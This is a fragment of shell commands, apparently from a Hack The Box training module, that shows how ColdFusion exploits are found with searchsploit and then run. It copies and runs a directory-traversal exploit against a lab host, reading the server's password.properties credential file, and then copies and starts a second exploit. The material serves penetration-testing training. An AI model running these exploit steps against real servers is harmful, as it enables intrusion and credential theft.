...
```shell-session
xF1NN@htb[/htb]$ searchsploit adobe coldfusion
...
```shell-session
xF1NN@htb[/htb]$ searchsploit -p 14641
...
```shell-session
xF1NN@htb[/htb]$ cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
xF1NN@htb[/htb]$ python2 14641.py 
...
```shell-session
xF1NN@htb[/htb]$ python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
...
```shell-session
xF1NN@htb[/htb]$ searchsploit -p 50057
...
```shell-session
xF1NN@htb[/htb]$ cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```
...
```shell-session
xF1NN@htb[/htb]$ python3 50057.py 
